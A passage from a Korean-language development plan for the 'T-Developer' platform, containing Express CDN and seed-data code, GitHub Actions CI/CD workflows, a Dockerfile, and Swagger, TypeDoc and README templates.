if (process.env.NODE_ENV === 'development' && process.env.USE_HTTPS === 'true') {
  const httpsServer = createHttpsServer(app);
  httpsServer.listen(443, () => {
    console.log('🔒 HTTPS Server running on https://localhost');
  });
}
```

### SubTask 0.6.4: 로컬 CDN 시뮬레이션
**목표**: 정적 파일 서빙을 위한 로컬 CDN 환경

**구현 내용**:
```typescript
// backend/src/services/local-cdn.ts
import express from 'express';
import path from 'path';
import { createHash } from 'crypto';
import { promises as fs } from 'fs';

export class LocalCDN {
  private app: express.Application;
  private cache: Map<string, Buffer> = new Map();
  
  constructor() {
    this.app = express();
    this.setupRoutes();
  }
  
  private setupRoutes() {
    // 정적 파일 서빙
    this.app.use('/static', express.static(path.join(process.cwd(), 'public'), {
      maxAge: '1y',
      etag: true,
      lastModified: true,
      setHeaders: (res, filepath) => {
        // 파일 타입별 캐시 설정
        if (filepath.endsWith('.js') || filepath.endsWith('.css')) {
          res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
        } else if (filepath.endsWith('.html')) {
          res.setHeader('Cache-Control', 'no-cache');
        }
        
        // CORS 헤더
        res.setHeader('Access-Control-Allow-Origin', '*');
      }
    }));
    
    // 이미지 최적화
    this.app.get('/images/:size/:filename', async (req, res) => {
      const { size, filename } = req.params;
      const cacheKey = `${size}-${filename}`;
      
      // 캐시 확인
      if (this.cache.has(cacheKey)) {
        res.setHeader('X-Cache', 'HIT');
        return res.send(this.cache.get(cacheKey));
      }
      
      // 이미지 리사이징 (sharp 라이브러리 사용)
      try {
        const originalPath = path.join(process.cwd(), 'public/images', filename);
        const [width, height] = size.split('x').map(Number);
        
        // 실제 구현에서는 sharp를 사용하여 리사이징
        // const resized = await sharp(originalPath).resize(width, height).toBuffer();
        
        res.setHeader('X-Cache', 'MISS');
        res.sendFile(originalPath); // 임시로 원본 전송
      } catch (error) {
        res.status(404).send('Image not found');
      }
    });
    
    // 파일 버전 관리
    this.app.get('/versioned/*', async (req, res) => {
      const filepath = req.params[0];
      const fullPath = path.join(process.cwd(), 'public', filepath);
      
      try {
        const content = await fs.readFile(fullPath);
        const hash = createHash('md5').update(content).digest('hex').substr(0, 8);
        
        res.setHeader('ETag', `"${hash}"`);
        res.setHeader('Cache-Control', 'public, max-age=31536000');
        
        res.send(content);
      } catch (error) {
        res.status(404).send('File not found');
      }
    });
  }
  
  start(port: number = 3002) {
    this.app.listen(port, () => {
      console.log(`🌐 Local CDN running on http://localhost:${port}`);
    });
  }
}
```

```nginx
# nginx/nginx.conf (로컬 CDN용)
worker_processes auto;

events {
    worker_connections 1024;
}

http {
    include /etc/nginx/mime.types;
    default_type application/octet-stream;
    
    # 캐싱 설정
    proxy_cache_path /var/cache/nginx levels=1:2 keys_zone=cdn_cache:10m max_size=1g inactive=60m;
    
    # Gzip 압축
    gzip on;
    gzip_vary on;
    gzip_min_length 1024;
    gzip_types text/plain text/css text/xml text/javascript application/json application/javascript application/xml+rss;
    
    server {
        listen 80;
        server_name cdn.localhost;
        
        location / {
            proxy_pass http://localhost:3002;
            proxy_cache cdn_cache;
            proxy_cache_valid 200 302 1d;
            proxy_cache_valid 404 1m;
            
            add_header X-Cache-Status $upstream_cache_status;
            add_header Cache-Control "public, max-age=31536000";
        }
        
        location ~* \.(jpg|jpeg|png|gif|ico|css|js)$ {
            expires 1y;
            add_header Cache-Control "public, immutable";
        }
    }
}
```

### SubTask 0.6.5: 개발 데이터 생성기
**목표**: 현실적인 테스트 데이터 자동 생성

**구현 내용**:
```typescript
// backend/src/utils/data-generator.ts
import { faker } from '@faker-js/faker';
import { DynamoDBDocumentClient, PutCommand } from '@aws-sdk/lib-dynamodb';

export class DevelopmentDataGenerator {
  constructor(private docClient: DynamoDBDocumentClient) {}
  
  async generateProjects(count: number = 50): Promise<void> {
    const projects = [];
    
    for (let i = 0; i < count; i++) {
      const project = {
        id: `proj_${faker.string.uuid()}`,
        userId: `user_${faker.string.uuid()}`,
        name: this.generateProjectName(),
        description: this.generateProjectDescription(),
        projectType: faker.helpers.arrayElement(['web', 'api', 'mobile', 'desktop', 'cli']),
        status: this.generateWeightedStatus(),
        createdAt: faker.date.past({ years: 1 }).toISOString(),
        updatedAt: faker.date.recent({ days: 30 }).toISOString(),
        
        // 기술 스택
        techStack: {
          frontend: faker.helpers.arrayElement(['react', 'vue', 'angular', 'svelte', null]),
          backend: faker.helpers.arrayElement(['node', 'python', 'java', 'go', null]),
          database: faker.helpers.arrayElement(['postgres', 'mysql', 'mongodb', 'dynamodb']),
          cloud: faker.helpers.arrayElement(['aws', 'gcp', 'azure', 'vercel'])
        },
        
        // 에이전트 실행 기록
        agentExecutions: this.generateAgentExecutions(),
        
        // 성능 메트릭
        metrics: {
          buildTime: faker.number.int({ min: 30, max: 600 }),
          totalCost: faker.number.float({ min: 0.01, max: 10.00, precision: 0.01 }),
          componentsUsed: faker.number.int({ min: 5, max: 50 }),
          linesOfCode: faker.number.int({ min: 1000, max: 50000 })
        }
      };
      
      projects.push(project);
    }
    
    // 배치로 저장
    for (const project of projects) {
      await this.docClient.send(new PutCommand({
        TableName: 'T-Developer-Projects',
        Item: project
      }));
    }
    
    console.log(`✅ ${count}개의 프로젝트 데이터 생성 완료`);
  }
  
  private generateProjectName(): string {
    const templates = [
      () => `${faker.commerce.productAdjective()} ${faker.hacker.noun()} Platform`,
      () => `${faker.company.buzzNoun()} Management System`,
      () => `${faker.hacker.adjective()} ${faker.hacker.noun()} API`,
      () => `${faker.commerce.product()} Tracker`,
      () => `${faker.company.buzzAdjective()} Analytics Dashboard`
    ];
    
    return faker.helpers.arrayElement(templates)();
  }
  
  private generateProjectDescription(): string {
    const intros = [
      'A modern web application that',
      'An innovative platform designed to',
      'A comprehensive solution for',
      'A cutting-edge system that'
    ];
    
    const actions = [
      'streamlines business processes',
      'enhances user engagement',
      'automates workflow management',
      'provides real-time analytics',
      'optimizes resource allocation'
    ];
    
    const benefits = [
      'increasing productivity by up to 40%',
      'reducing operational costs',
      'improving customer satisfaction',
      'enabling data-driven decisions',
      'facilitating team collaboration'
    ];
    
    return `${faker.helpers.arrayElement(intros)} ${faker.helpers.arrayElement(actions)}, ${faker.helpers.arrayElement(benefits)}.`;
  }
  
  private generateWeightedStatus(): string {
    // 가중치를 둔 상태 생성 (더 현실적인 분포)
    const weights = {
      'completed': 0.6,
      'building': 0.2,
      'testing': 0.1,
      'analyzing': 0.05,
      'error': 0.05
    };
    
    const random = Math.random();
    let cumulative = 0;
    
    for (const [status, weight] of Object.entries(weights)) {
      cumulative += weight;
      if (random < cumulative) {
        return status;
      }
    }
    
    return 'completed';
  }
  
  private generateAgentExecutions(): any[] {
    const agents = [
      'nl-input', 'ui-selection', 'parsing', 'component-decision',
      'matching-rate', 'search', 'generation', 'assembly', 'download'
    ];
    
    return agents.map((agent, index) => ({
      agentName: agent,
      executionTime: faker.number.int({ min: 100, max: 5000 }),
      status: index < 7 ? 'completed' : faker.helpers.arrayElement(['completed', 'running', 'pending']),
      tokensUsed: faker.number.int({ min: 100, max: 10000 })
    }));
  }
  
  async generateComponents(count: number = 200): Promise<void> {
    const components = [];
    
    const componentTypes = {
      'authentication': ['login-form', 'oauth-provider', 'jwt-handler', 'session-manager'],
      'database': ['orm-wrapper', 'query-builder', 'migration-tool', 'connection-pool'],
      'ui': ['data-table', 'chart-library', 'form-builder', 'modal-system'],
      'api': ['rest-client', 'graphql-resolver', 'rate-limiter', 'api-gateway'],
      'utility': ['logger', 'validator', 'error-handler', 'config-manager']
    };
    
    for (let i = 0; i < count; i++) {
      const category = faker.helpers.objectKey(componentTypes);
      const componentName = faker.helpers.arrayElement(componentTypes[category]);
      
      const component = {
        id: `comp_${faker.string.uuid()}`,
        name: `${faker.company.buzzAdjective()}-${componentName}`,
        category,
        version: faker.system.semver(),
        language: faker.helpers.arrayElement(['javascript', 'typescript', 'python', 'java']),
        framework: faker.helpers.arrayElement(['react', 'vue', 'express', 'fastapi', 'spring']),
        
        // 품질 메트릭
        qualityScore: faker.number.float({ min: 3.0, max: 5.0, precision: 0.1 }),
        downloads: faker.number.int({ min: 100, max: 1000000 }),
        stars: faker.number.int({ min: 10, max: 50000 }),
        issues: faker.number.int({ min: 0, max: 100 }),
        
        // 메타데이터
        author: faker.person.fullName(),
        license: faker.helpers.arrayElement(['MIT', 'Apache-2.0', 'GPL-3.0', 'BSD-3-Clause']),
        lastUpdated: faker.date.recent({ days: 90 }).toISOString(),
        description: faker.lorem.sentence(),
        keywords: faker.lorem.words(5).split(' '),
        
        // 의존성
        dependencies: this.generateDependencies(),
        
        // 사용 통계
        usageStats: {
          projects: faker.number.int({ min: 1, max: 1000 }),
          successRate: faker.number.float({ min: 85, max: 100, precision: 0.1 }),
          avgIntegrationTime: faker.number.int({ min: 5, max: 60 })
        }
      };
      
      components.push(component);
    }
    
    // Elasticsearch에 인덱싱 (실제 구현 시)
    for (const component of components) {
      await this.docClient.send(new PutCommand({
        TableName: 'T-Developer-Components',
        Item: component
      }));
    }
    
    console.log(`✅ ${count}개의 컴포넌트 데이터 생성 완료`);
  }
  
  private generateDependencies(): Record<string, string> {
    const deps: Record<string, string> = {};
    const count = faker.number.int({ min: 0, max: 10 });
    
    const commonDeps = [
      'lodash', 'axios', 'express', 'react', 'vue',
      'moment', 'uuid', 'bcrypt', 'jsonwebtoken', 'dotenv'
    ];
    
    for (let i = 0; i < count; i++) {
      const dep = faker.helpers.arrayElement(commonDeps);
      deps[dep] = `^${faker.system.semver()}`;
    }
    
    return deps;
  }
}

// 실행 스크립트
export async function seedDevelopmentData() {
  const generator = new DevelopmentDataGenerator(docClient);
  
  console.log('🌱 개발 데이터 생성 시작...');
  
  await Promise.all([
    generator.generateProjects(100),
    generator.generateComponents(500)
  ]);
  
  console.log('✅ 모든 개발 데이터 생성 완료!');
}
```

**🔧 사용자 작업**:
- `npm install @faker-js/faker` 실행
- SSL 인증서 생성: `./scripts/generate-ssl-certs.sh`
- LocalStack 초기화: `python scripts/setup-localstack.py`
- 개발 데이터 생성: `npm run seed:dev`

---

## Task 0.7: CI/CD 파이프라인 기초 설정

### SubTask 0.7.1: GitHub Actions 워크플로우 설정
**목표**: 자동화된 테스트 및 빌드 파이프라인

**구현 내용**:
```yaml
# .github/workflows/ci.yml
name: CI Pipeline

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main, develop ]

env:
  NODE_VERSION: '18.x'
  PYTHON_VERSION: '3.10'
  AWS_REGION: 'us-east-1'

jobs:
  lint:
    name: Lint Code
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: 'npm'
          
      - name: Install dependencies
        run: |
          cd backend
          npm ci
          
      - name: Run ESLint
        run: |
          cd backend
          npm run lint
          
      - name: Run Prettier check
        run: |
          cd backend
          npm run format:check

  test:
    name: Run Tests
    runs-on: ubuntu-latest
    needs: lint
    
    services:
      dynamodb:
        image: amazon/dynamodb-local
        ports:
          - 8000:8000
      redis:
        image: redis:7-alpine
        ports:
          - 6379:6379
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: 'npm'
          
      - name: Install dependencies
        run: |
          cd backend
          npm ci
          
      - name: Run unit tests
        run: |
          cd backend
          npm run test:unit
          
      - name: Run integration tests
        run: |
          cd backend
          npm run test:integration
        env:
          DYNAMODB_ENDPOINT: http://localhost:8000
          REDIS_HOST: localhost
          
      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
          directory: ./backend/coverage
          flags: backend
          
  security-scan:
    name: Security Scan
    runs-on: ubuntu-latest
    needs: lint
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Run Snyk security scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high
          
      - name: Run npm audit
        run: |
          cd backend
          npm audit --audit-level=high
          
      - name: Run OWASP dependency check
        uses: dependency-check/Dependency-Check_Action@main
        with:
          project: 't-developer'
          path: '.'
          format: 'HTML'
          
  build:
    name: Build Application
    runs-on: ubuntu-latest
    needs: [test, security-scan]
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: 'npm'
          
      - name: Install dependencies
        run: |
          cd backend
          npm ci
          
      - name: Build TypeScript
        run: |
          cd backend
          npm run build
          
      - name: Upload build artifacts
        uses: actions/upload-artifact@v3
        with:
          name: build-artifacts
          path: backend/dist/
          retention-days: 7
```

### SubTask 0.7.2: 자동 버전 관리 설정
**목표**: Semantic Versioning 자동화

**구현 내용**:
```json
// .releaserc.json
{
  "branches": ["main"],
  "plugins": [
    "@semantic-release/commit-analyzer",
    "@semantic-release/release-notes-generator",
    "@semantic-release/changelog",
    "@semantic-release/npm",
    "@semantic-release/github",
    [
      "@semantic-release/git",
      {
        "assets": ["package.json", "package-lock.json", "CHANGELOG.md"],
        "message": "chore(release): ${nextRelease.version} [skip ci]\n\n${nextRelease.notes}"
      }
    ]
  ]
}
```

```yaml
# .github/workflows/release.yml
name: Release

on:
  push:
    branches: [ main ]

jobs:
  release:
    name: Release
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
          token: ${{ secrets.GITHUB_TOKEN }}
          
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '18.x'
          
      - name: Install dependencies
        run: npm ci
        
      - name: Run semantic-release
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        run: npx semantic-release
```

### SubTask 0.7.3: Docker 이미지 빌드 파이프라인
**목표**: 자동화된 Docker 이미지 빌드 및 푸시

**구현 내용**:
```yaml
# .github/workflows/docker.yml
name: Docker Build and Push

on:
  push:
    branches: [ main, develop ]
    tags: [ 'v*' ]

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  build-and-push:
    name: Build and Push Docker Image
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
      
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3
        
      - name: Log in to GitHub Container Registry
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
          
      - name: Extract metadata
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            type=ref,event=branch
            type=ref,event=pr
            type=semver,pattern={{version}}
            type=semver,pattern={{major}}.{{minor}}
            type=sha
            
      - name: Build and push Docker image
        uses: docker/build-push-action@v5
        with:
          context: ./backend
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
          build-args: |
            NODE_ENV=production
            BUILD_DATE=${{ github.event.head_commit.timestamp }}
            VCS_REF=${{ github.sha }}
```

```dockerfile
# backend/Dockerfile
# Build stage
FROM node:18-alpine AS builder

WORKDIR /app

# Copy package files
COPY package*.json ./
RUN npm ci --only=production

# Copy source code
COPY . .

# Build application
RUN npm run build

# Runtime stage
FROM node:18-alpine

# Install dumb-init for proper signal handling
RUN apk add --no-cache dumb-init

# Create non-root user
RUN addgroup -g 1001 -S nodejs
RUN adduser -S nodejs -u 1001

WORKDIR /app

# Copy node_modules and built application
COPY --from=builder --chown=nodejs:nodejs /app/node_modules ./node_modules
COPY --from=builder --chown=nodejs:nodejs /app/dist ./dist
COPY --from=builder --chown=nodejs:nodejs /app/package.json ./

# Switch to non-root user
USER nodejs

# Expose port
EXPOSE 8000

# Health check
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD node healthcheck.js || exit 1

# Start application with dumb-init
ENTRYPOINT ["dumb-init", "--"]
CMD ["node", "dist/main.js"]
```
---

### SubTask 0.7.4: 테스트 자동화 파이프라인 설정
**목표**: PR 및 머지 시 자동 테스트 실행 설정

**구현 내용**:
```yaml
# .github/workflows/test-automation.yml
name: Automated Testing Pipeline

on:
  pull_request:
    types: [opened, synchronize, reopened]
  push:
    branches: [main, develop]

jobs:
  test-matrix:
    name: Test Suite - ${{ matrix.test-suite }}
    runs-on: ubuntu-latest
    
    strategy:
      matrix:
        test-suite: [unit, integration, e2e]
        node-version: [18.x, 20.x]
        include:
          - test-suite: unit
            timeout: 10
          - test-suite: integration
            timeout: 20
          - test-suite: e2e
            timeout: 30
    
    services:
      dynamodb:
        image: amazon/dynamodb-local
        ports:
          - 8000:8000
        options: >-
          --health-cmd "curl http://localhost:8000"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
      
      redis:
        image: redis:7-alpine
        ports:
          - 6379:6379
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js ${{ matrix.node-version }}
        uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node-version }}
          cache: 'npm'
      
      - name: Cache dependencies
        uses: actions/cache@v3
        with:
          path: |
            node_modules
            ~/.npm
          key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
          restore-keys: |
            ${{ runner.os }}-node-
      
      - name: Install dependencies
        run: |
          cd backend
          npm ci
      
      - name: Setup test environment
        run: |
          cd backend
          npm run test:setup:${{ matrix.test-suite }}
        env:
          DYNAMODB_ENDPOINT: http://localhost:8000
          REDIS_HOST: localhost
      
      - name: Run ${{ matrix.test-suite }} tests
        run: |
          cd backend
          npm run test:${{ matrix.test-suite }} -- --coverage
        timeout-minutes: ${{ matrix.timeout }}
        env:
          NODE_ENV: test
          CI: true
      
      - name: Upload coverage reports
        if: matrix.node-version == '18.x'
        uses: actions/upload-artifact@v3
        with:
          name: coverage-${{ matrix.test-suite }}
          path: backend/coverage/
      
      - name: Comment test results on PR
        if: github.event_name == 'pull_request' && matrix.node-version == '18.x'
        uses: actions/github-script@v7
        with:
          script: |
            const testResults = require('./backend/test-results.json');
            const comment = `## Test Results - ${{ matrix.test-suite }}
            
            ✅ Passed: ${testResults.numPassedTests}
            ❌ Failed: ${testResults.numFailedTests}
            ⏭️ Skipped: ${testResults.numPendingTests}
            ⏱️ Duration: ${(testResults.duration / 1000).toFixed(2)}s
            
            Coverage: ${testResults.coverage}%`;
            
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: comment
            });
```

### SubTask 0.7.5: 의존성 업데이트 자동화
**목표**: 보안 취약점 및 의존성 업데이트 자동화

**구현 내용**:
```yaml
# .github/workflows/dependency-update.yml
name: Dependency Update Automation

on:
  schedule:
    - cron: '0 9 * * 1' # 매주 월요일 오전 9시
  workflow_dispatch:

jobs:
  update-dependencies:
    name: Update Dependencies
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v4
        with:
          token: ${{ secrets.GITHUB_TOKEN }}
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '18.x'
      
      - name: Update npm dependencies
        run: |
          cd backend
          npx npm-check-updates -u --target minor
          npm install
          npm audit fix
      
      - name: Run tests after update
        run: |
          cd backend
          npm test
        continue-on-error: true
      
      - name: Create Pull Request
        uses: peter-evans/create-pull-request@v5
        with:
          token: ${{ secrets.GITHUB_TOKEN }}
          commit-message: 'chore: update dependencies'
          title: '🔄 Weekly Dependency Update'
          body: |
            ## Automated Dependency Update
            
            This PR contains the following updates:
            - Minor version updates for all dependencies
            - Security patches applied via `npm audit fix`
            
            ### Checklist
            - [ ] All tests pass
            - [ ] No breaking changes identified
            - [ ] Security vulnerabilities resolved
          branch: deps/weekly-update
          delete-branch: true
```

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/backend"
    schedule:
      interval: "daily"
    open-pull-requests-limit: 5
    groups:
      aws-sdk:
        patterns:
          - "@aws-sdk/*"
      development:
        patterns:
          - "@types/*"
          - "eslint*"
          - "prettier*"
          - "jest*"
    
  - package-ecosystem: "docker"
    directory: "/"
    schedule:
      interval: "weekly"
    
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

**🔧 사용자 작업**:
- GitHub 저장소 Settings에서 Dependabot 활성화
- Dependabot 보안 알림 설정
- 자동 머지 규칙 설정 (선택사항)

---

## Task 0.8: 문서화 시스템 구축

### SubTask 0.8.1: API 문서 자동 생성 설정
**목표**: OpenAPI/Swagger 기반 API 문서 자동화

**구현 내용**:
```typescript
// backend/src/config/swagger.ts
import swaggerJsdoc from 'swagger-jsdoc';
import swaggerUi from 'swagger-ui-express';
import { Express } from 'express';

const swaggerOptions: swaggerJsdoc.Options = {
  definition: {
    openapi: '3.0.0',
    info: {
      title: 'T-Developer API',
      version: '1.0.0',
      description: 'AI-powered multi-agent development platform API',
      contact: {
        name: 'T-Developer Team',
        email: 'support@t-developer.com'
      },
      license: {
        name: 'MIT',
        url: 'https://opensource.org/licenses/MIT'
      }
    },
    servers: [
      {
        url: 'http://localhost:8000/api/v1',
        description: 'Development server'
      },
      {
        url: 'https://api.t-developer.com/v1',
        description: 'Production server'
      }
    ],
    components: {
      securitySchemes: {
        bearerAuth: {
          type: 'http',
          scheme: 'bearer',
          bearerFormat: 'JWT'
        },
        apiKey: {
          type: 'apiKey',
          in: 'header',
          name: 'X-API-Key'
        }
      }
    }
  },
  apis: [
    './src/routes/*.ts',
    './src/models/*.ts',
    './src/controllers/*.ts'
  ]
};

export function setupSwagger(app: Express): void {
  const swaggerSpec = swaggerJsdoc(swaggerOptions);
  
  // Swagger UI
  app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerSpec, {
    explorer: true,
    customCss: '.swagger-ui .topbar { display: none }',
    customSiteTitle: 'T-Developer API Documentation'
  }));
  
  // JSON spec endpoint
  app.get('/api-docs.json', (req, res) => {
    res.setHeader('Content-Type', 'application/json');
    res.send(swaggerSpec);
  });
}

// API 엔드포인트 문서화 예시
/**
 * @swagger
 * /projects:
 *   post:
 *     summary: Create a new project
 *     tags: [Projects]
 *     security:
 *       - bearerAuth: []
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             required:
 *               - name
 *               - description
 *             properties:
 *               name:
 *                 type: string
 *                 description: Project name
 *               description:
 *                 type: string
 *                 description: Natural language project description
 *               projectType:
 *                 type: string
 *                 enum: [web, api, mobile, desktop, cli]
 *               targetPlatforms:
 *                 type: array
 *                 items:
 *                   type: string
 *     responses:
 *       201:
 *         description: Project created successfully
 *         content:
 *           application/json:
 *             schema:
 *               $ref: '#/components/schemas/Project'
 *       400:
 *         description: Invalid request
 *       401:
 *         description: Unauthorized
 */
```

### SubTask 0.8.2: 코드 문서화 표준 설정
**목표**: JSDoc/TSDoc 표준 및 자동 생성 설정

**구현 내용**:
```typescript
// backend/typedoc.json
{
  "entryPoints": ["./src"],
  "entryPointStrategy": "expand",
  "out": "./docs/api",
  "exclude": [
    "**/*.test.ts",
    "**/*.spec.ts",
    "**/node_modules/**"
  ],
  "theme": "default",
  "name": "T-Developer API Reference",
  "includeVersion": true,
  "excludePrivate": true,
  "excludeProtected": false,
  "excludeInternal": true,
  "readme": "./README.md",
  "plugin": ["typedoc-plugin-markdown"],
  "githubPages": false,
  "validation": {
    "notExported": true,
    "invalidLink": true,
    "notDocumented": false
  }
}
```

```typescript
// backend/src/standards/documentation.ts
/**
 * T-Developer 문서화 표준 예시
 * 
 * @module DocumentationStandards
 */

/**
 * 프로젝트 생성 서비스
 * 
 * @class ProjectService
 * @description 자연어 설명을 기반으로 프로젝트를 생성하고 관리하는 서비스
 * 
 * @example
 * ```typescript
 * const projectService = new ProjectService();
 * const project = await projectService.createProject({
 *   name: "My E-commerce Platform",
 *   description: "Create a modern e-commerce platform with React and Node.js"
 * });
 * ```
 */
export class ProjectService {
  /**
   * 새로운 프로젝트 생성
   * 
   * @param {CreateProjectDto} dto - 프로젝트 생성 정보
   * @param {string} dto.name - 프로젝트 이름
   * @param {string} dto.description - 자연어 프로젝트 설명
   * @param {string} [dto.projectType] - 프로젝트 타입 (web, api, mobile 등)
   * @param {string[]} [dto.targetPlatforms] - 대상 플랫폼 목록
   * 
   * @returns {Promise<Project>} 생성된 프로젝트 정보
   * 
   * @throws {ValidationError} 입력 데이터가 유효하지 않은 경우
   * @throws {QuotaExceededError} 프로젝트 생성 한도 초과
   * 
   * @since 1.0.0
   * @author T-Developer Team
   */
  async createProject(dto: CreateProjectDto): Promise<Project> {
    // 구현...
  }
  
  /**
   * 프로젝트 상태 업데이트
   * 
   * @param {string} projectId - 프로젝트 ID
   * @param {ProjectStatus} status - 새로운 상태
   * @param {Object} [metadata] - 추가 메타데이터
   * 
   * @returns {Promise<void>}
   * 
   * @fires ProjectStatusChanged - 상태 변경 시 이벤트 발생
   * 
   * @internal
   */
  private async updateProjectStatus(
    projectId: string, 
    status: ProjectStatus,
    metadata?: Record<string, any>
  ): Promise<void> {
    // 구현...
  }
}
```

### SubTask 0.8.3: README 템플릿 생성
**목표**: 프로젝트 및 컴포넌트별 README 템플릿

**구현 내용**:
```markdown
<!-- templates/README-project.md -->
# {{PROJECT_NAME}}

![T-Developer](https://img.shields.io/badge/Generated%20by-T--Developer-blue)
![Version](https://img.shields.io/badge/version-{{VERSION}}-green)
![License](https://img.shields.io/badge/license-{{LICENSE}}-yellow)

## 📋 프로젝트 개요

{{PROJECT_DESCRIPTION}}

### 🎯 주요 기능
{{#FEATURES}}
- {{.}}
{{/FEATURES}}

## 🚀 빠른 시작

### 필수 요구사항
- Node.js {{NODE_VERSION}}+
- {{#REQUIREMENTS}}{{.}}, {{/REQUIREMENTS}}

### 설치
```bash
# 저장소 클론
git clone {{REPOSITORY_URL}}
cd {{PROJECT_NAME}}

# 의존성 설치
npm install

# 환경 변수 설정
cp .env.example .env
# .env 파일을 편집하여 필요한 값 설정
```

### 실행
```bash
# 개발 모드
npm run dev

# 프로덕션 빌드
npm run build

# 프로덕션 실행
npm start
```

## 🏗️ 프로젝트 구조

```
{{PROJECT_NAME}}/
├── src/
│   ├── controllers/    # API 컨트롤러
│   ├── services/       # 비즈니스 로직
│   ├── models/         # 데이터 모델
│   ├── routes/         # API 라우트
│   └── utils/          # 유틸리티 함수
├── tests/              # 테스트 파일
├── docs/               # 문서
└── scripts/            # 스크립트
```

## 📚 API 문서

API 문서는 다음 주소에서 확인할 수 있습니다:
- 개발: http://localhost:{{PORT}}/api-docs
- 프로덕션: {{PRODUCTION_URL}}/api-docs

## 🧪 테스트

```bash
# 단위 테스트
npm run test:unit

# 통합 테스트
npm run test:integration

# 전체 테스트
npm test
```

## 🔧 환경 변수

| 변수명 | 설명 | 기본값 |
|--------|------|--------|
{{#ENV_VARS}}
| {{NAME}} | {{DESCRIPTION}} | {{DEFAULT}} |
{{/ENV_VARS}}

## 🤝 기여하기

기여를 환영합니다! [CONTRIBUTING.md](./CONTRIBUTING.md)를 참고해주세요.

## 📄 라이선스

이 프로젝트는 {{LICENSE}} 라이선스 하에 배포됩니다.

---

Generated with ❤️ by [T-Developer](https://github.com/t-developer)
```

```typescript
// backend/src/utils/readme-generator.ts
import Handlebars from 'handlebars';
import fs from 'fs/promises';
import path from 'path';

export class ReadmeGenerator {
  private template: HandlebarsTemplateDelegate;
  
  constructor(templatePath: string) {
    this.loadTemplate(templatePath);
  }
  
  private async loadTemplate(templatePath: string): Promise<void> {
    const templateContent = await fs.readFile(templatePath, 'utf-8');
    this.template = Handlebars.compile(templateContent);
  }
  
  async generate(project: Project): Promise<string> {
    const context = {
      PROJECT_NAME: project.name,
      VERSION: '1.0.0',
      LICENSE: 'MIT',
      PROJECT_DESCRIPTION: project.description,
      FEATURES: this.extractFeatures(project),
      NODE_VERSION: '18',
      REQUIREMENTS: this.extractRequirements(project),
      REPOSITORY_URL: `https://github.com/${project.userId}/${project.name}`,
      PORT: 3000,
      PRODUCTION_URL: `https://api.${project.name}.com`,
      ENV_VARS: this.extractEnvVars(project)
    };
    
    return this.template(context);
  }
  
  private extractFeatures(project: Project): string[] {
    // 프로젝트에서 주요 기능 추출
    return [
      '사용자 인증 및 권한 관리',
      'RESTful API',
      '실시간 데이터 업데이트',
      '확장 가능한 아키텍처'
    ];
  }
  
  private extractRequirements(project: Project): string[] {
    const reqs = ['npm 8+'];
    
    if (project.techStack?.database) {
      reqs.push(project.techStack.database);
    }
    
    if (project.techStack?.cloud === 'aws') {
      reqs.push('AWS CLI');
    }
    
    return reqs;
  }
  
  private extractEnvVars(project: Project): any[] {
    return [
      { NAME: 'NODE_ENV', DESCRIPTION: '실행 환경', DEFAULT: 'development' },
      { NAME: 'PORT', DESCRIPTION: '서버 포트', DEFAULT: '3000' },
      { NAME: 'DATABASE_URL', DESCRIPTION: '데이터베이스 연결 URL', DEFAULT: 'N/A' }
    ];
  }
}
```

### SubTask 0.8.4: 개발자 가이드 문서 구조
**목표**: 개발자를 위한 종합 가이드 문서 구조 생성

**구현 내용**:
```markdown
<!-- docs/developer-guide/index.md -->
# T-Developer 개발자 가이드

## 📚 목차

### 1. [시작하기](./getting-started.md)
- 시스템 요구사항
- 설치 및 설정
- 첫 프로젝트 생성

### 2. [아키텍처 개요](./architecture.md)
- 시스템 아키텍처
- 멀티 에이전트 시스템
- 기술 스택

### 3. [에이전트 개발](./agents/)
- [에이전트 프레임워크](./agents/framework.md)
- [에이전트 타입](./agents/types.md)
